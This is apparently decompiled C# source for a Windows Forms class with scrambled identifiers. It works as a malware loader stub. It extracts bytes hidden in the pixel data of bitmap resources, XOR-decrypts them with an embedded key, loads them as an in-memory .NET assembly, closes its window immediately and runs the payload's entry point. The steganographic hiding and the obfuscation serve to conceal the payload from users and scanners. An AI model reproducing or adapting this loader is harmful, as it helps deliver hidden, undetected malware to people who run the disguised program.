using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using asxNBfTVFSUCxZl.Properties;

namespace asxNBfTVFSUCxZl;

public class EHligDtfrEwzkI : Form
{
	private delegate Assembly UNNNvwFGhi(byte[] lBQTYNAxVWDUsu);

	private IContainer components = null;

	private string[] NubFkzcMzbgQuaW;

	private MethodInfo diXUGpJjgiiCxdm;

	private byte[] gpOHBKqjwJdAMsN
	{
		get
		{
			Console.WriteLine();
			return new byte[17]
			{
				36, 115, 221, 31, 75, 187, 221, 87, 33, 217,
				104, 210, 38, 116, 196, 5, 167
			};
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_00f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f6: Expected O, but got Unknown
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(489, 199));
		((Control)this).set_Name("EHligDtfrEwzkI");
		((Control)this).set_Text("EHligDtfrEwzkI");
		((Form)this).add_Load((EventHandler)EHligDtfrEwzkI_Load);
		((Control)this).ResumeLayout(false);
		byte[] array = new byte[0];
		string[] array2 = new string[10] { "JWRWYPHMrMf", "hHvEmmyDzyfKVKSXsr", "AclEkFFQnlD", "RtdXfQoIXDu", "QgDZwNXFMY", "WGdtHSMXxlaHDPBb", "dcsChgorqommb", "kTnKuqvyCCKSDpmqVtQ", "FTOAzmtwGRmxVyw", "cKJbNPmjrRWN" };
		string[] array3 = array2;
		foreach (string name in array3)
		{
			Bitmap val = (Bitmap)Resources.ResourceManager.GetObject(name);
			byte[] array4 = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 4];
			Rectangle rectangle = new Rectangle(0, 0, ((Image)val).get_Width(), ((Image)val).get_Height());
			BitmapData val2 = val.LockBits(rectangle, (ImageLockMode)3, ((Image)val).get_PixelFormat());
			Marshal.Copy(val2.get_Scan0(), array4, 0, array4.Length);
			byte[] array5 = new byte[BitConverter.ToInt32(array4, 0)];
			Array.Copy(array4, 4, array5, 0, array5.Length);
			val.UnlockBits(val2);
			Array.Resize(ref array, array.Length + array5.Length);
			Array.Copy(array5, 0, array, array.Length - array5.Length, array5.Length);
		}
		for (int j = 0; j < array.Length; j++)
		{
			for (int k = 0; k < gpOHBKqjwJdAMsN.Length; k++)
			{
				array[j] = (byte)(array[j] ^ gpOHBKqjwJdAMsN[k]);
			}
		}
		Assembly assembly = Assembly.Load(array);
		diXUGpJjgiiCxdm = assembly.EntryPoint;
	}

	public EHligDtfrEwzkI(string[] args)
	{
		NubFkzcMzbgQuaW = args;
		InitializeComponent();
	}

	private void EHligDtfrEwzkI_Load(object sender, EventArgs e)
	{
		((Form)this).Close();
		diXUGpJjgiiCxdm.Invoke(null, new object[1] { NubFkzcMzbgQuaW });
	}
}
